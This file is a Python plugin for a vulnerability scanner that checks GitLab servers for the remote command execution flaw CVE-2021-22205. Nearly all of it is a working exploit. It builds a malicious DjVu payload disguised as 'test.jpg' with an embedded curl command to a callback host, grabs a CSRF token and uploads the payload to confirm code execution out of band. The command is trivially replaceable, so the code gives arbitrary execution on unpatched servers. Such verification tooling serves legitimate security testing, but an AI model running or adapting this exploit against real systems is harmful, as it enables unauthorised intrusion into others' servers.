import re

import requests

import config
import reverse
from xing.core.BasePlugin import BasePlugin
from xing.core import PluginType, SchemeType


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "Gitlab 命令执行漏洞 CVE-2021-22205"
        self.app_name = "Gitlab"
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        session = requests.Session()
        session.verify = False
        CSRF_PATTERN = re.compile(rb'csrf-token" content="(.*?)" />')
        command = "curl " + config.reverse_url
        payload = b'\x41\x54\x26\x54\x46\x4f\x52\x4d'
        payload += (len(command) + 0x55).to_bytes(length=4, byteorder='big', signed=True)
        payload += b'\x44\x4a\x56\x55\x49\x4e\x46\x4f\x00\x00\x00\x0a\x00\x00\x00\x00\x18\x00\x2c\x01\x16\x01\x42\x47\x6a\x70\x00\x00\x00\x00\x41\x4e\x54\x61'
        payload += (len(command) + 0x2f).to_bytes(length=4, byteorder='big', signed=True)
        payload += b'\x28\x6d\x65\x74\x61\x64\x61\x74\x61\x0a\x09\x28\x43\x6f\x70\x79\x72\x69\x67\x68\x74\x20\x22\x5c\x0a\x22\x20\x2e\x20\x71\x78\x7b'
        payload += command.encode()
        payload += b'\x7d\x20\x2e\x20\x5c\x0a\x22\x20\x62\x20\x22\x29\x20\x29\x0a'
        file = [('file', ('test.jpg', payload, 'image/jpeg'))]
        csrf_resp = session.get(f"{target}/users/sign_in", headers={"Origin": target})
        csrf = CSRF_PATTERN.search(csrf_resp.content).group(1).decode()
        rev_token = reverse.request_code('headers["User-Agent"].contains("curl")')
        session.post(f'{target}/uploads/user', files=file, headers={"X-CSRF-Token": csrf})
        rev_resp = reverse.check(rev_token)
        if rev_resp is not None:
            self.logger.success("CVE-2021-22205 {}".format(target))
            return "Gitlab rce https://github.com/vulhub/vulhub/blob/master/gitlab/CVE-2021-22205/README.zh-cn.md"
